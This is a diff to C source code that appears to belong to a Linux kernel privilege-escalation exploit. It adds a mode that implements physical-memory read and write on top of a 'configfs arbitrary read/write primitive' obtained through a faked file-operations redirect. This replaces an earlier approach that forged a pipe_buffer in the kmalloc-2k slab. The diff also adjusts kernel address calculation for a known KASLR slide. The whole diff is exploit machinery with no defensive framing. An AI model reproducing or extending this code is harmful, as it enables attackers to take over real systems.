@@ -43,6 +43,9 @@ static int       pr_pipe_idx = -1;  /* index into pr_reclaim_fds */
 
 /* Diagnostic globals referenced by fops.c */
 int pipe_cache_gate_ok;
+/* CFG_PHYSRW: route physrw through the configfs arbitrary R/W primitive
+ * instead of a forged pipe_buffer (no kmalloc-2k slab needed). */
+int configfs_physrw;
 int physrw_read_ok;
 int physrw_write_ok;
 int physrw_read64_ok;
@@ -102,7 +105,10 @@ static uintptr_t pr_pipe_buf_ops(void) {
 static uintptr_t pr_kmalloc_caches(void) {
   uint64_t off = (active_offsets && active_offsets->off_kmalloc_caches)
     ? active_offsets->off_kmalloc_caches : KMALLOC_CACHES_OFF;
-  return data_addr(KIMAGE_TEXT_BASE + off);
+  /* Known slide -> canonical image mapping (data_addr's linear alias needs an
+   * unknown phys delta; see BAN_GIAO 22.2).  kmalloc_caches is read-only. */
+  return (kaslr_slide != 0) ? text_addr(KIMAGE_TEXT_BASE + off)
+                            : data_addr(KIMAGE_TEXT_BASE + off);
 }
 
 /* ---------- vmemmap conversion ---------- */
@@ -356,6 +362,9 @@ static int pr_find_buffer(int fd, uintptr_t base) {
  */
 int pipe_phys_read_data(int fd, uintptr_t direct_addr,
                         void *out, size_t len) {
+  if (configfs_physrw) {
+    return kernel_read_data(fd, direct_addr, out, len) == (ssize_t)len;
+  }
   if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
     return 0;
   }
@@ -404,6 +413,9 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr,
  */
 int pipe_phys_write_data(int fd, uintptr_t direct_addr,
                          const void *data, size_t len) {
+  if (configfs_physrw) {
+    return kernel_write_data(fd, direct_addr, data, len) == (ssize_t)len;
+  }
   if (pr_buf_addr == 0 || pr_pipe_idx < 0) {
     return 0;
   }
@@ -604,4 +616,26 @@ int install_pipe_physrw(int configfs_fd) {
   }
 
   return all_ok;
+}
+
+/* ---------- configfs-only physrw ---------- */
+
+/*
+ * Skip the kmalloc-2k slab scan / pipe_buffer forgery entirely and implement
+ * physrw on top of the configfs arbitrary read/write primitive (which is
+ * already proven to read and write any kernel address, any length, once the
+ * fake fops redirect is in place).  Selected by CFG_PHYSRW=1 (default).
+ */
+int install_configfs_physrw(int fd) {
+  (void)fd;
+  configfs_physrw = 1;
+  pipe_cache_gate_ok = 1;
+  pipe_cache_page_index = 0;
+  physrw_read_ok = 1;
+  physrw_write_ok = 1;
+  physrw_read64_ok = 1;
+  physrw_write64_ok = 1;
+  pr_success("physrw: configfs-only mode (pipe slab scan bypassed)\n");
+  fsync(1);
+  return 1;
 }
